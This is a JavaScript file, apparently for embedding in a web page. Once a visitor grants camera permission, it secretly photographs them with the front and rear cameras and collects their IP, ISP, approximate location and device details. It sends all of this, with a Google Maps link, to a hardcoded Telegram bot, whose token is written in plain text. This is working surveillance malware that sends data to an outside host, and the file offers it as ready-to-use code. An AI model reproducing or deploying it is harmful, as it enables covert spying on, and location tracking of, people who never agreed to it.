const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: '', ip: '', isp: '', address: '',
  lat: '', lon: '', device: '', os: ''
};

// Hàm lấy thông tin thiết bị
function detectDevice() {
  const ua = navigator.userAgent;
  info.time = new Date().toLocaleString('vi-VN');
  info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
  info.device = navigator.platform;
}

// Hàm lấy IP và Vị trí (Chỉ gọi khi đã có quyền Cam)
async function fetchPrivateData() {
  try {
    const res = await fetch(`https://ipwho.is/`);
    const d = await res.json();
    info.ip = d.ip;
    info.isp = d.connection?.org || 'N/A';
    info.lat = d.latitude;
    info.lon = d.longitude;
    info.address = `${d.city}, ${d.region}`;
  } catch (e) {}
}

// Hàm chụp ảnh
async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

// Hàm gửi dữ liệu (Chỉ gửi khi có ảnh)
async function sendData(front, back) {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  const caption = `
📡 [CẢNH BÁO TRUY CẬP]
🕒 ${info.time}
📱 ${info.device} (${info.os})
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ ${info.address}
📍 Maps: ${mapsLink}
`.trim();

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  
  const media = [];
  media.push({ type: 'photo', media: 'attach://f', caption: caption });
  formData.append('f', front, 'front.jpg');
  
  if (back) {
    media.push({ type: 'photo', media: 'attach://b' });
    formData.append('b', back, 'back.jpg');
  }

  formData.append('media', JSON.stringify(media));
  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}

// HÀM CHÍNH: QUYẾT ĐỊNH CÓ GỬI HAY KHÔNG
async function main() {
  // 1. Thử xin quyền và chụp cam trước ngay lập tức
  const frontPhoto = await captureCamera("user");

  // 2. KIỂM TRA: Nếu không có ảnh (Từ chối/Lỗi) -> DỪNG NGAY LẬP TỨC
  if (!frontPhoto) {
    console.log("Dừng: Người dùng từ chối camera.");
    return; // THOÁT HÀM, không chạy bất cứ lệnh nào bên dưới
  }

  // 3. Nếu ĐÃ CHO PHÉP: Mới bắt đầu thu thập các thông tin nhạy cảm khác
  detectDevice();
  await fetchPrivateData();
  const backPhoto = await captureCamera("environment");

  // 4. Gửi toàn bộ gói dữ liệu có kèm ảnh
  await sendData(frontPhoto, backPhoto);
}
